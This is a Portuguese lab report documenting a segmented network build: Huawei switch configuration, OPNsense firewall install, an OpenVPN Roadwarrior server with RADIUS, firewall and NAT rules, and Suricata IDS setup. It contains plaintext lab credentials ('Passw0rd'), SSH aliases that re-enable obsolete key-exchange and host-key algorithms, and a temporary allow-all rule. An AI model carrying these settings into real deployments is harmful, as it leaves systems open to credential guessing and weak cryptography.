\# CONFIGURAÇÃO COMPLETA DO SWITCH HUAWEI SW2_AMM

\#

\# ========================================================

**\# Definir nome do switch (identifica o grupo AMM)**

sysname SW2_AMM

**\# Criar as 4 VLANs exigidas pelo enunciado**

vlan batch 10 20 30 103

**\# Interface de gestão do próprio switch (IP na VLAN 103)**

interface Vlanif103

ip address 10.103.50.3 255.255.255.0

**\# Porta onde está ligado o pfSense VenusSuf (lado WAN - VLAN 20)**

interface GigabitEthernet0/0/1

description Port_pfSense_WAN_VLAN20

port link-type access

port default vlan 20

**\# Porta onde está ligado o Windows Server 2022 (Green Marte - VLAN
20)**

interface GigabitEthernet0/0/2

description Port_WinServer_VLAN20

port link-type access

port default vlan 20

**\# Porta de gestão física**

interface GigabitEthernet0/0/3

description Port_Gestao_VLAN103

port link-type access

port default vlan 103

**\# Porta trunk para o SW1 (interligação entre switches)**

interface GigabitEthernet0/0/24

description Trunk_to_SW1

port link-type trunk

port trunk allow-pass vlan 10 20 30 103

**\# Rota default para chegar ao Router**

ip route-static 0.0.0.0 0.0.0.0 10.103.50.1

**\# Configuração da consola**

user-interface con 0

authentication-mode password

set authentication password cipher Passw0rd

screen-length 0

\#

Return

As figuras seguintes demonstram as configurações implementadas.

![](./images/media/image6.png)

*Figura 6 - Excerto da configuração corrente (running-config) do
Router_AMM, evidenciando a definição do hostname, encriptação de
passwords e a configuração do pool DHCP para a Zona RED.*

![](./images/media/image7.png)

*Figura 7 - Configuração de interfaces no Router_AMM, destacando a
implementação de redundância via protocolo VRRP na interface WAN e a
segmentação lógica de rede através de sub-interfaces com encapsulamento
802.1Q (dot1Q) para as zonas RED e Venus_WAN, com as respetivas regras
de NAT (inside/outside) aplicadas.*

![](./images/media/image8.png)

*Figura 8 - Configuração de interfaces e protocolos de encaminhamento no
Router_AMM, evidenciando a segmentação por sub-interfaces (VLAN 30 e
103), a implementação de redundância de gateway via VRRP na interface
WAN e a ativação do NAT Overload com registo de auditoria (syslog).*

![](./images/media/image9.png)

*Figura 9 - Configuração de segurança e gestão do Router_AMM,
evidenciando as rotas estáticas para a rede externa (CINEL), a ativação
do SSH v2 e a implementação de ACLs Standard (1 e 10) para controlo de
tráfego NAT e restrição de acesso administrativo às linhas VTY.*

![](./images/media/image10.png)

*Figura 10 - Verificação do estado das interfaces no Router_AMM através
do comando show ip interface brief, confirmando a operacionalidade das
sub-interfaces (VLANs 10, 20, 30 e 103) e a conectividade da interface
física GigabitEthernet0/0/1 à rede WAN.*

![](./images/media/image11.png)

*Figura 11 - Verificação das Listas de Controlo de Acesso através do
comando show access-lists, evidenciando as permissões da ACL 1 para
tráfego NAT e a monitorização de acessos na ACL 10, onde o contador
de matches confirma a atividade de rede das zonas autorizadas.*

![](./images/media/image12.png)

*Figura 12 - Verificação dos parâmetros de acesso remoto no Router_AMM,
confirmando a ativação do protocolo SSH v2 com cifras de encriptação
fortes (AES-CTR e HMAC-SHA2-256) e a monitorização de sessões
administrativas ativas de utilizadores autenticados.*

![](./images/media/image13.png)

*Figura 13 - Configuração de VLANs e interfaces de tronco no switch
SW1_AMM, demonstrando a criação em bloco das VLANs 10, 20, 30 e 103, e a
definição do modo Trunk (802.1Q) nas portas de interligação para
permitir a passagem do tráfego segmentado entre o router e os restantes
switches.*

![](./images/media/image14.png)

*Figura 14 - Configuração de interfaces no switch SW1_AMM, demonstrando
a definição do modo Trunk (802.1Q) com permissão para as VLANs do
projeto e a configuração de um porto em modo Access atribuído à VLAN 10
(Zona Red) para a ligação da máquina de auditoria.*

![](./images/media/image15.png)

*Figura 15 - Configuração de segurança local e ativação de interfaces no
switch SW1_AMM, demonstrando a definição de passwords cifradas para a
consola e o comando undo shutdown para a ativação física dos portos
GigabitEthernet destinados às zonas Venus e Red.*

![](./images/media/image16.png)

*Figura 16 - Configuração de interfaces de acesso no switch SW1_AMM,
evidenciando a atribuição da porta GigabitEthernet0/0/3 à VLAN 30
(OPNsense) e da porta GigabitEthernet0/0/4 à VLAN 103 (Gestão),
incluindo a ativação física das mesmas através do comando undo
shutdown.*

![](./images/media/image17.png)

*Figura 17 - Configuração da interface lógica Vlanif103 no switch
SW1_AMM, demonstrando a atribuição do endereço IP estático 10.103.50.2 à
VLAN de Gestão, permitindo a comunicação administrativa do switch com o
router e os restantes dispositivos da rede.*

##### Gestão e Administração Remota: Resolução de Incompatibilidades SSH

**Interoperabilidade e Segurança em Ambientes de Administração**\
Durante a fase de implementação da gestão centralizada a partir do
servidor Debian (Wazuh), do Windows 11, etc, verificou-se uma
discrepância de segurança entre as versões mais recentes dos clientes
SSH de Linux e o suporte de cifras nos equipamentos de rede (Cisco e
Huawei). Por predefinição, as versões atuais de OpenSSH desativam
algoritmos considerados obsoletos, como o diffie-hellman-group14-sha1 e
o ssh-rsa, devido a vulnerabilidades conhecidas. No entanto, para
garantir a administração remota destes ativos de rede em ambiente de
laboratório, foi necessário ajustar os parâmetros de negociação do
protocolo.

**Otimização do Fluxo de Trabalho via Aliases**\
Para evitar a introdução manual e repetitiva de comandos complexos de
configuração de cifras em cada ligação, procedeu-se à criação
de **Aliases** no ficheiro de configuração do perfil do utilizador
(.bashrc). Esta técnica de administração de sistemas permite associar um
comando curto e personalizado a uma instrução longa que inclui as
exceções de algoritmos de troca de chaves (*KexAlgorithms*) e de
assinatura de chaves de host (*HostKeyAlgorithms*). Esta solução garante
que a administração se mantém eficiente, permitindo o acesso imediato
aos equipamentos através de comandos simples como ssh-router, sem
comprometer a segurança global do sistema operativo Debian.

![](./images/media/image18.png)

*Figura 18 - Configuração de **Aliases** de administração no servidor
Debian (Wazuh), evidenciando a criação de uma instrução personalizada no
ficheiro .bashrc para forçar o uso de algoritmos de troca de chaves
compatíveis com o Router_AMM, contornando as restrições de segurança
nativas do OpenSSH moderno.*

![](./images/media/image19.png)

*Figura 19 - Demonstração da administração remota entre o servidor
Debian (Wazuh) e o Router_AMM, evidenciando a utilização do **alias
SSH** para estabelecer a ligação e a subsequente verificação do estado
das interfaces (VLANs 10, 20, 30 e 103) através do comando show ip
interface brief.*

![](./images/media/image20.png)

*Figura 20 - Edição do ficheiro .bashrc no servidor **Wazuh
(Debian)** para a criação de aliases persistentes
(ssh-router, ssh-sw1, ssh-sw2), incorporando as diretivas de algoritmos
obsoletos necessárias para garantir a compatibilidade do cliente SSH
moderno com o Router e Switches da infraestrutura.*

![](./images/media/image21.png)

*Figura 21 - Configuração e validação de funções personalizadas no
PowerShell (Windows 11), evidenciando a criação do ficheiro de perfil
(\$PROFILE) e o ajuste da política de execução (Execution Policy) para
permitir a utilização do alias ssh-router, culminando no acesso
bem-sucedido à consola do Router_AMM.*

![](./images/media/image22.png)

*Figura 22 - Demonstração de administração remota via PowerShell
(Windows 11), evidenciando o acesso SSH bem-sucedido ao switch SW1_AMM
(10.103.50.2) e a verificação da ACL 2000, que restringe o acesso
administrativo a sub-redes específicas da rede de gestão e zonas
autorizadas.*

![](./images/media/image23.png)

*Figura 23 - Consola do servidor Wazuh (Debian) demonstrando a análise
de logs de respostas ativas (active-responses.log) seguida do acesso
administrativo ao switch SW1_AMM via alias SSH, onde se valida a
configuração da ACL 2000 para controlo de acessos baseada em IPs de
gestão específicos.*

![](./images/media/image24.png)

*Figura 24 - Demonstração de administração remota via **PowerShell
(Windows Server)**, evidenciando o acesso SSH bem-sucedido ao
switch **SW1_AMM** (10.103.50.2) e a verificação da **ACL 2000**, que
restringe o acesso administrativo permitindo apenas IPs específicos da
rede de gestão e da rede de utilizadores autorizada.*

![](./images/media/image25.png)

*Figura 25 - Edição do ficheiro de perfil do PowerShell (\$PROFILE) no
host Windows, demonstrando a criação da função ssh-router para
automatizar a inserção de algoritmos de troca de chaves (KexAlgorithms)
e cifras obsoletas, garantindo o acesso imediato e transparente ao
Router_AMM a partir da consola.*

# 

## Segurança Perimetral (OPNsense -- MarteSuf)

**Implementação e Provisionamento da Firewall OPNsense**\
Após a consolidação da infraestrutura de comutação e encaminhamento,
procedeu-se à implementação da firewall **OPNsense** para a
zona **MarteSuf**. A escolha desta plataforma baseia-se na sua robustez
como solução *open-source* de nível empresarial, oferecendo
funcionalidades avançadas de filtragem de pacotes (*Stateful
Inspection*), deteção de intrusões e gestão granular de interfaces.
Nesta fase inicial, o foco incidiu sobre o provisionamento do sistema
operativo em ambiente virtualizado, garantindo a correta atribuição de
recursos e o acesso administrativo necessário para as configurações
posteriores de rede e segurança.

## OPNsense -- Instalação

O processo de instalação foi iniciado a partir da imagem ISO oficial,
seguindo um fluxo de trabalho estruturado para garantir a integridade do
sistema. Os passos da instalação e a autenticação inicial no modo de
instalação estão ilustrados nas figuras seguintes:

-   **Login:** installer

-   **Password:** Passw0rd

![](./images/media/image26.png)

*Figura 26 -  Interface de consola do **OPNsense** durante a fase de
arranque em modo Live/Installer, exibindo as chaves de impressão digital
(fingerprints) SSH para validação de autenticidade e o prompt de
autenticação para início do processo de instalação no disco virtual.*

![](./images/media/image27.png)

*Figura 27 -  Seleção do mapa de teclado (keymap) no instalador do
OPNsense.*

![](./images/media/image28.png)

*Figura 28 -  Seleção do sistema de ficheiros e modo de particionamento
(ZFS/UEFI) no instalador do OPNsense.*

![](./images/media/image29.png)

*Figura 29 -  Seleção do nível de redundância de disco (**ZFS Stripe**)
no instalador do **OPNsense**.*

![](./images/media/image30.png)

*Figura 30 -  Seleção do disco virtual (**da0**) para a criação do pool
de armazenamento **ZFS** no instalador.*

![](./images/media/image31.png)

*Figura 31 -  Confirmação de escrita e **formatação do disco** virtual
para a instalação do sistema.*

![](./images/media/image32.png)

*Figura 32 -  Monitorização do **progresso da instalação** e clonagem
dos ficheiros do sistema OPNsense para o disco.*

![](./images/media/image33.png)

*Figura 33 - Configuração final e alteração da **password do utilizador
root** no OPNsense.*

![](./images/media/image34.png)

*Figura 34 - Definição da palavra-passe para o utilizador root no
instalador do OPNsense.*

![](./images/media/image35.png)

*Figura 35 - Finalização da instalação e confirmação de saída do
instalador do OPNsense.*

![](./images/media/image36.png)

*Figura 36 - Conclusão da instalação e reinício (Reboot now) do sistema
OPNsense.*

Nota: Após a instalação estar concluída, desligamos a máquina, isto
porque o OpnSense não injecta

o "CD" automaticamente.

Na Tab CD/DVD (IDE) dos Settings, mudamos a Connection para **Use
physical drive à**

**Auto Detect**.

Acabámos de instalar o OPNsense e estamos no menu de consola, logo após
o primeiro boot. Este

menu é por onde começamos a configurar as interfaces básicas antes de
aceder ao web GUI.

##### Configuração dos interfaces do OPNSense.

![](./images/media/image37.png)

*Figura 37 - Configuração do interface WAN (em0)*

![](./images/media/image38.png)

*Figura 38 - Configuração do interface LAN (em1) e do interface OPT1
(em2)*

![](./images/media/image39.png)

*Figura 39 - Configuração do IP da WAN*

![](./images/media/image40.png)

*Figura 40 - Configuração do gateway*

![](./images/media/image41.png)

*Figura 41 - Configuração do IP da LAN*

![](./images/media/image42.png)

*Figura 42 - Configuração do gateway*

![](./images/media/image43.png)

*Figura 43 - Acesso à GUI do OPNSense (IP 172.30.50.97) através do
browser do Windows Server*

![](./images/media/image44.png)

*Figura 44 - Introdução das credenciais de acesso à GUI do OPNSense*

##### Configuração inicial através do Wizard.

![](./images/media/image45.png)

*Figura 45 - Dashboard do OPNSense -- Configuração inicial utilizando o
Wizard*

No menu seguinte definimos o hostname, domínio timezone e o IP do DNS
server

![](./images/media/image46.png)

*Figura 46 - Dashboard do OPNSense - Configuração inicial utilizando o
Wizard*

De seguida, definimos o IP do interface WAN e respectivo gateway.

![](./images/media/image47.png)

*Figura 47 - Dashboard do OPNSense - Configuração inicial utilizando o
Wizard*

Definimos o IP do interface da LAN.

![](./images/media/image48.png)

*Figura 48 - Dashboard do OPNSense - Configuração inicial utilizando o
Wizard*

Atribuímos uma password segura.

![](./images/media/image49.png)

*Figura 49 - Dashboard do OPNSense - Configuração inicial utilizando o
Wizard*

![](./images/media/image50.png)

*Figura 50 - Dashboard do OPNSense - Configuração inicial utilizando o
Wizard - Finalização*

![](./images/media/image51.png)

*Figura 51 - Dashboard do OPNSense -- Updates (atualização do sistema)*

##### OPT1 (em2) - Configuração

Agora que os interfaces WAN e LAN já estão definidos, terminamos a
configuração dos interfaces.

Vamos a **Interfaces à OPT1** na interface web do OPNsense e preenche:

-   **Enable**: Sim

-   **IPv4 Configuration Type**: Static IPv4

-   **IPv4 Address**: 192.168.150.241/29 *(primeiro IP disponível da
    rede Orange)*

-   **Description**: Orange

**Save à Apply Changes**

![](./images/media/image52.png)

![](./images/media/image53.png)

![](./images/media/image54.png)

*Figura 52 - Dashboard do OPNSense -- Configuração do interface OPT1*

A regra Allow all Orange temp, ilustrada nos prints seguintes, foi
criada apenas para permitir:

-   Acesso à internet para instalar software (NXLog, Wazuh agent)

-   Testes iniciais de conectividade

Em produção esta regra não devia existir. Deve por isso ser **removida
ou desativada** agora que as instalações estão concluídas.

![](./images/media/image55.png)

![](./images/media/image56.png)

![](./images/media/image57.png)

*Figura 53 - Dashboard do OPNSense -- Criação de regra para o interface
OPT1*

## Criar a Autoridade de Certificação (CA) e Certificado no OPNsense

O OpenVPN precisa de certificados para encriptar o túnel - garante que a
comunicação entre o cliente e o servidor é encriptada. Autentica o
servidor OpenVPN ao cliente, garantindo que o cliente está a ligar ao
servidor correto e não a um impostor. O certificado é usado para
autenticar o servidor, não o utilizador.

No OPNsense, vamos a **System à Trust à Authorities**.

-   Clicamos em **Add**.

    -   **Descriptive name:** VPN-CA-Marte.

    -   **Method:** Create an internal Certificate Authority.

    -   Preenchemos os campos (Country, City, etc.)

![](./images/media/image58.png)

*Figura 54 - Criação da Autoridade de Certificação (CA) e do Certificado
no OPNsense*

De seguida vamos a **System à Trust à Certificates**.

-   Clicamos em **Add**.

    -   **Method:** Create an internal Certificate.

    -   **Descriptive name:** VPN-Server-Cert.

    -   **Type:** Server Certificate.

    -   **Issuer:** Escolhemos a VPN-CA-Marte que criámos anteriormente

![](./images/media/image59.png)

![](./images/media/image60.png)

*Figura 55 - Criação da Autoridade de Certificação (CA) e do Certificado
no OPNsense*

## Configuração do Servidor OpenVPN Roadwarrior no OPNsense (MarteSuf)

Vamos a **VPN à OpenVPN à Instances**. Clicamos no botão **(+)**.

-   **Role:** Server

-   **Description:** VPN_Acesso_IT

-   **Protocol:** UDP (IPv4)

-   **Port:** 1194

-   **Type:** tun

-   **Server:** 10.200.50.0/24

-   **Authentication:** Escolhemos o nosso servidor **RADIUS**.

-   **CA (Certificate Authority):** Escolhemos a VPN-CA-Marte que
    criámos anteriormente.

-   **Certificate:** Escolhemos o VPN-Server-Cert.

-   **Redirect Gateway:** Default

-   **Register DNS:** Sim

-   **DNS Default Domain**: AntMarMat.win

-   **DNS Servers**: IP do Windows Server 2022

![](./images/media/image61.png)

![](./images/media/image62.png)

![](./images/media/image63.png)

![](./images/media/image64.png)

![](./images/media/image65.png)

*Figura 56 - Configuração do Servidor OpenVPN Roadwarrior no OPNsense
(MarteSuf)*

![](./images/media/image66.png)

*Figura 57 - Visualização do Servidor OpenVPN Roadwarrior criado no
OPNsense (MarteSuf)*

**Explicação:**

**Server (IPv4): 10.200.50.0/24**

Este campo define a **rede virtual do túnel VPN** --- é uma rede
completamente nova que não existe fisicamente em lado nenhum. O OPNsense
vai:

-   Atribuir a si próprio o IP 10.200.50.1 (gateway do túnel)

-   Atribuir ao cliente Windows um IP dentro dessa rede, ex: 10.200.50.2

É basicamente uma \"rede imaginária\" que só existe dentro do túnel
encriptado, para os dois lados terem um IP com que comunicar. Podemos
usar qualquer rede privada que **não esteja já em uso** no nosso
ambiente --- usámos o 10.200.50.0/24 por isso mesmo, é uma rede livre no
nosso esquema.

Esta configuração cria um servidor VPN do tipo **Roadwarrior** no
OPNsense, permitindo que utilizadores remotos --- neste caso o Windows
11 da WAN Interna --- acedam de forma segura à zona Green do MarteSuf
através de um túnel encriptado.

A autenticação é feita via RADIUS integrado com o Active Directory,
garantindo que apenas utilizadores pertencentes ao grupo IT do domínio
AntMarMat.win podem estabelecer a ligação. Quando a VPN está ativa, todo
o tráfego de internet do cliente é redirecionado pelo túnel (redirect
gateway), e o DNS utilizado passa a ser o do Windows Server, permitindo
a resolução de nomes do domínio.

## Regras de Firewall

##### Regra na WAN (para aceitar ligações OpenVPN)

**Firewall à Rules à WAN à Add**

-   Action: Pass

-   Protocol: UDP

-   Destination: WAN address

-   Destination port: 1194

-   Description: Allow OpenVPN IT

Esta regra permite que o tráfego UDP na porta 1194 chegue ao OPNsense
pela interface WAN, que é a porta padrão do OpenVPN. Sem esta regra, o
firewall bloquearia as tentativas de ligação VPN dos clientes externos
antes de chegarem ao servidor OpenVPN.

![](./images/media/image67.png)

![](./images/media/image68.png)

*Figura 58 - Criação de regra na WAN, para aceitar ligações OpenVPN*

##### Regra na interface OpenVPN (para os clientes acederem à Green)

**Firewall à Rules à OpenVPN à Add**

-   Action: Pass

-   Source: any

-   Destination: any

-   Description: VPN clients access

-   

Esta regra permite que os clientes VPN, depois de estabelecerem o túnel,
consigam comunicar com os recursos da zona Green do MarteSuf, como o
Windows Server e o Wazuh. Sem esta regra, mesmo com a VPN ligada, o
tráfego dos clientes seria bloqueado pelo firewall ao tentar aceder à
rede interna.

![](./images/media/image69.png)

*Figura 59 - OpnVpn logo*

![](./images/media/image70.png)

![](./images/media/image71.png)

*Figura 60 - Regra na interface OpenVPN (para os clientes acederem à
Green)*

##### Regra específica --- RDP sim, PING não

O cliente Windows pode, através da VPN, aceder via **RDP ao Windows
Server mas não consegue pingá-lo**. Isso faz-se com duas regras na
interface OpenVPN, por esta ordem:

**Regra 1 --- Bloquear ICMP:**

-   Action: Block

-   Protocol: ICMP

-   Source: OpenVPN net

-   Destination: LAN net

-   Description: Block ICMP from VPN

Esta regra bloqueia o ping (ICMP) dos clientes VPN para a zona Green,
cumprindo o requisito do enunciado que indica que o Windows 11 da WAN
Interna, quando ligado à VPN, não deve conseguir fazer ping ao Windows
Server, apenas aceder via RDP.

![](./images/media/image72.png)

![](./images/media/image73.png)

![](./images/media/image74.png)

*Figura 61 - Regra de bloqueio o ping (ICMP) dos clientes VPN para a
zona Green*

**Regra 2 --- Permitir RDP:**

-   Action: Pass

-   Protocol: TCP

-   Source: OpenVPN net

-   Destination: LAN net

-   Destination port: 3389

-   Description: Allow RDP from VPN

Esta regra permite que os clientes VPN acedam ao Windows Server via RDP
(porta 3389), cumprindo o requisito do enunciado que indica que o
utilizador da WAN Interna, após ligar a VPN, deve conseguir aceder
remotamente ao Windows Server através do protocolo Remote Desktop.

![](./images/media/image75.png)

![](./images/media/image76.png)

![](./images/media/image77.png)

*Figura 62 - Regra que permite o acesso RDP através da OpnVPN*

**Regra 3 --- Permitir restante tráfego (exceto ping):**

-   Action: Pass

-   Protocol: TCP

-   Source: OpenVPN net

-   Destination: any

Esta regra permite que os clientes VPN acedam a outros serviços TCP da
rede interna além do RDP, como partilhas de ficheiros, serviços web e
outros recursos do domínio, garantindo a funcionalidade completa da VPN
para os utilizadores IT enquanto o ping continua bloqueado pela regra
anterior.

![](./images/media/image78.png)

![](./images/media/image79.png)

![](./images/media/image80.png)

*Figura 63 - Regra que permite o restante tráfego (exceto ping)*

Nota: A ordem das regras é importante --- **o Block ICMP tem de estar
acima das regras Pass**.

![](./images/media/image81.png)

*Figura 64 - Visualização das regras da OpnVPN*

##### Gerar o ficheiro .ovpn

Vamos a:

**VPN à OpenVPN à Client Export**

-   Selecionamos a instância VPN_Acesso_IT

-   Export type: File Only

-   Clicamos Export à guardamos o **.ovpn**

-   Hostname: colocamos o IP da WAN do OPNsense --- 10.30.50.130

-   Port: 1194

-   Na linha (none) Exclude certificate from export --- clicamos no
    ícone de download à direita

Este (none) é o correto para RADIUS --- exportamos o **.ovpn** sem
certificado de cliente, que é exatamente o que precisamos.

![](./images/media/image82.png)

*Figura 65 - Gerar o ficheiro .ovpn*

O ficheiro .ovpn é o perfil de configuração que o cliente OpenVPN
utiliza para estabelecer a ligação. Contém todas as definições
necessárias como o endereço do servidor, porta, protocolo e o
certificado da CA. Como a autenticação é feita via RADIUS
(user/password), não é necessário exportar um certificado de cliente ---
daí selecionar a opção (none). Este ficheiro é posteriormente importado
no OpenVPN Connect instalado no Windows 11 da WAN Interna.

### Testar no cliente Windows 11 (winclient_red - WAN Interna)

**VPN OpenVPN Roadwarrior --- Acesso IT ao MarteSuf**

Esta VPN permite que utilizadores pertencentes ao departamento de IT,
localizados na WAN Interna, acedam de forma segura à zona Green do
firewall MarteSuf. A **autenticação é realizada via RADIUS**, integrado
com o Active Directory do Windows Server 2022, garantindo que apenas
utilizadores do grupo IT possam estabelecer a ligação. O túnel é
encriptado com TLS, utilizando uma Autoridade de Certificação interna
criada no OPNsense. Quando a VPN está estabelecida, todo o tráfego de
internet do cliente é redirecionado pelo túnel, e **o DNS utilizado
passa a ser o do servidor Windows**, permitindo a resolução de nomes do
domínio AntMarMat.win. O acesso RDP ao Windows Server é permitido, mas o
ping é bloqueado por regras de firewall.

O conceito de Roadwarrior significa, portanto, que um cliente
móvel/remoto (neste caso o Windows 11 na WAN Interna) que se liga a um
servidor VPN centralizado (o OPNsense) para aceder à rede interna. O
cliente pode estar em qualquer lado, e a VPN dá-lhe acesso como se
estivesse dentro da rede.

Contrasta com uma VPN **Site-to-Site** (como a IPSec que iremos
configurar entre VenusSuf e MarteSuf) onde são duas redes fixas a ligar
entre si.

**Resumo:**

**Roadwarrior** --- o utilizador pode estar em qualquer lado (casa,
café, hotel, etc.) e liga-se ao servidor VPN. É pensada para **pessoas**
que se movem.

**IPSec Site-to-Site** --- liga **duas redes fixas** entre si de forma
permanente. Por exemplo, a rede do escritório de Lisboa liga à rede do
escritório do Porto. As duas firewalls sabem sempre onde estão e a
ligação é geralmente sempre ativa.

#####  

##### Instalar o OpenVPN Connect no cliente Windows 11 da WAN Interna (VLAN 10 RED):

-   No Windows 11, vamos a
    [**https://openvpn.net/client/**](https://openvpn.net/client/)

-   Clicamos em **\"Download OpenVPN Connect\"** para Windows

-   Instalamos --- este não precisa de UAC da mesma forma

-   Abrimos o OpenVPN Connect

-   Clicamos em **\"Upload File\"** e importamos o ficheiro **.ovpn.**

-   Tentamos ligar com o plinha / Passw0rd.

![](./images/media/image83.png)

*Figura 66 - Download e instalação da OpenVPN do Windows 11 da zona
Red.*

O OpenVPN Connect é o cliente VPN instalado no Windows 11 da WAN Interna
que permite estabelecer o túnel encriptado com o servidor OpenVPN do
OPNsense. Após importar o ficheiro .ovpn com as configurações do
servidor, o utilizador autentica-se com as credenciais do domínio ---
neste caso um utilizador pertencente ao grupo IT --- que são validadas
pelo servidor RADIUS integrado com o Active Directory do Windows Server
2022.

![](./images/media/image84.png)

*Figura 67 - Instalação da OpenVPN do Windows 11 da zona Red.*

![](./images/media/image85.png)

*Figura 68 - Instalação da OpenVPN do Windows 11 da zona Red.*

![](./images/media/image86.png)

*Figura 69 - Instalação da OpenVPN do Windows 11 da zona Red.*

![](./images/media/image87.png)

*Figura 70 - Instalação da OpenVPN do Windows 11 da zona Red.*

![](./images/media/image88.png)

*Figura 71 - Instalação da OpenVPN do Windows 11 da zona Red.*

![](./images/media/image89.png)

*Figura 72 - Instalação da OpenVPN do Windows 11 da zona Red --
Importação do ficheiro .ovpn*

![](./images/media/image90.png)

*Figura 73 - Instalação da OpenVPN do Windows 11 da zona Red --
Importação do ficheiro .ovpn*

![](./images/media/image91.png)

*Figura 74 - Instalação da OpenVPN do Windows 11 da zona Red --
Importação do ficheiro .ovpn*

![](./images/media/image92.png)

*Figura 75 - Instalação da OpenVPN do Windows 11 da zona Red --
Importação do ficheiro .ovpn*

![](./images/media/image93.png)

*Figura 76 - Instalação da OpenVPN do Windows 11 da zona Red -- Login
com as credenciais de um user do IT*

![](./images/media/image94.png)

*Figura 77 - Login através da OpnVpn efetuado com sucesso*

![](./images/media/image95.png)

*Figura 78 - Ping falhado ao Windows Server da zona green*

##### Conectar via RDP ao Windows Server

Win + R à mstsc à colocamos o ip do Windows Server 172.30.50.98 à user
AntMarMat\\plinha / Passw0rd

![](./images/media/image96.png)

*Figura 79 - Win + R à mstsc -- Iniciar o RDP*

![](./images/media/image97.png)

*Figura 80 - Introdução do IP do Windows Server para efetuar a conexão*

![](./images/media/image98.png)

*Figura 81 - Introdução do user do IT com o qual queremos efetuar a
conexão*

![](./images/media/image99.png)

*Figura 82 - Introdução da password do user do IT com o qual queremos
efetuar a conexão*

![](./images/media/image100.png)

*Figura 83 - RDP Login - Finalização*

**Certificate error**

Não é um problema neste caso. Este aviso é normal em ambientes de
laboratório --- significa apenas que o certificado do Windows Server é
auto-assinado e não é reconhecido por uma CA pública.

Devemos clicar **Yes** para continuar. Em ambiente de produção
resolvia-se instalando o certificado da CA no cliente.

Com a VPN estabelecida, o utilizador acede ao Windows Server via Remote
Desktop Protocol (RDP), introduzindo as credenciais do domínio. Este
acesso demonstra que o túnel VPN está funcional e que o utilizador IT
consegue gerir remotamente o servidor como se estivesse dentro da rede
interna, cumprindo o requisito do enunciado.

![](./images/media/image101.png)

*Figura 84 - VPN estabelecida, o utilizador acede ao Windows Server via
Remote Desktop Protocol (RDP)*

![](./images/media/image102.png)

*Figura 85 - VPN estabelecida, o utilizador acede ao Windows Server via
Remote Desktop Protocol (RDP)*

### NAT para internet funcionar através da VPN no MarteSuf

No OPNsense vamos a **Firewall à NAT à Outbound**:

Precisamos de adicionar uma segunda regra para a rede VPN. Clicamos
**+** e preenche:

-   **Interface**: WAN

-   **Source address**: Network → 10.200.50.0/24

-   **Source port**: any

-   **Destination address**: any

-   **Destination port**: any

-   **Translation / target**: Interface address

-   **Description**: NAT VPN Roadwarrior

**Save → Apply Changes**

Depois testa a internet no winclient_red com a VPN ligada.

![](./images/media/image103.png)

![](./images/media/image104.png)

*Figura 86 - Regra NAT para internet funcionar através da VPN no
MarteSuf*

Neste momento já é possível aceder à internet com a OpenVpn ligada.

![](./images/media/image105.png)

*Figura 86 - Acesso à internet com VPN OpenVPN estabelecida*

Esta configuração de **NAT** permite que os dispositivos ligados
via **VPN** acedam à internet ao \"mascarar\" o seu IP interno
(10.200.50.0/24) com o IP público da interface **WAN**. Sem este passo,
os sites externos não conseguem responder aos pedidos da VPN porque não
reconhecem endereços privados. Basicamente, o **OPNsense** atua como um
tradutor para que o tráfego da rede remota seja aceite na rede pública.

## Configurar o Suricata no OPNsense (MarteSuf)

A configuração do Suricata no OPNsense ativa o sistema de deteção de
intrusões para monitorizar o tráfego que passa pelas interfaces WAN e
LAN. Ao selecionar o Modo Promíscuo e o registo de Logs, o sistema
consegue analisar todos os pacotes da rede e gerar alertas detalhados
sobre possíveis ameaças. No final, o download das regras é o que permite
ao software identificar ataques conhecidos e manter a segurança da rede
atualizada.

Vamos a **Services à Intrusion Detection**

**General Settings:**

-   **Enabled**: Sim

-   **IPS mode**: Não

-   **Promiscuous mode**: Sim

-   **Interfaces**: selecionamos WAN e LAN

-   **Logging:**

```
<!-- -->
```
-   **Enable syslog alerts**: Sim

-   **Enable eve syslog output**: Sim

-   **Rotate log**: Weekly

Clicamos **Apply** e depois vamos ao separador **Download** para
instalar as regras.

![](./images/media/image106.png)

*Figura 87 - Configuração do Suricata como IDS*

Vamos ao separador **Download** e:

-   Procuramos **ET open** na lista e ativamos os seguintes:

    -   ET open/emerging-scan --- port scan

    -   ET open/emerging-dos --- ataques DOS

    -   ET open/emerging-exploit --- exploits gerais

-   Procuramos **OPNsense** na lista e ativamos o seguinte:

    -   OPNsense-App-detect/test

-   Clicamos em **Enable Selected** à **Download & Update Rules**

-   Aguardamos o download --- pode demorar alguns minutos

![](./images/media/image107.png)

*Figura 88 - Download das regras do Suricata*

![](./images/media/image108.png)

*Figura 89 - Download das regras do Suricata*

![](./images/media/image109.png)

*Figura 90 - Download das regras do Suricata*

Agora vamos ao separador **Rules** verificar se as regras foram
importadas. Fazemos **Apply**.

![](./images/media/image110.png)

*Figura 91 - Services à Intrusion Detection -- Separador Rules do
Suricata*

Ainda no separador **Rules** e pesquisamos por scan --- as regras do
emerging-scan devem aparecer. Selecionamos todas e clicamos **\"Enable
selected\"** para as ativar. **Devemos verificar se todas estão como
enabled - ET open/emerging-scan --- port scan ; ET open/emerging-dos ---
ataques DOS ; ET open/emerging-exploit.**

![](./images/media/image111.png)

*Figura 92 - Services à Intrusion Detection -- Separador Rules do
Suricata*

![](./images/media/image112.png)

*Figura 93 - Services à Intrusion Detection -- Separador Rules do
Suricata*

##### Criação de regra User defined 

Para garantir a monitorização e identificação do tráfego na VLAN10
(Red), configuraram-se regras personalizadas no separador User Defined
do Suricata. Esta abordagem permite ao sistema de deteção de intrusões
analisar especificamente os pacotes desta rede e gerar alertas adaptados
às suas necessidades de segurança.

![](./images/media/image113.png)

*Figura 94 - Criação de regra custom no separador User Defined*

![](./images/media/image114.png)

*Figura 95 - Criação de regra custom no separador User Defined*

Após a configuração do **Suricata**, procedeu-se à fase de testes para
validar a eficácia do sistema na deteção de potenciais ameaças e
intrusões. Através da simulação de tráfego malicioso controlado,
confirmou-se que as regras estão ativas, tendo os testes sido
bem-sucedidos após a verificação dos alertas registados no
separador **Alerts**. Esta etapa permitiu garantir que a monitorização
da rede está plenamente operacional e a identificar corretamente os
eventos de segurança.

![](./images/media/image115.png)

*Figura 96 - Visualização dos alertas gerados pelo Suricata*

![](./images/media/image116.png)

*Figura 97 - Visualização dos alertas gerados pelo Suricata através da
ferramenta TCPDump*

![](./images/media/image117.png)

*Figura 98 - Visualização dos alertas gerados pelo Suricata*

## VPN IPSec entre MarteSuf (OPNsense) e VenusSuf (PFsense)

A VPN IPsec estabelece um túnel seguro e cifrado para interligar redes
geograficamente distantes através de uma infraestrutura pública, como a
Internet. No cenário descrito, esta tecnologia permite a comunicação
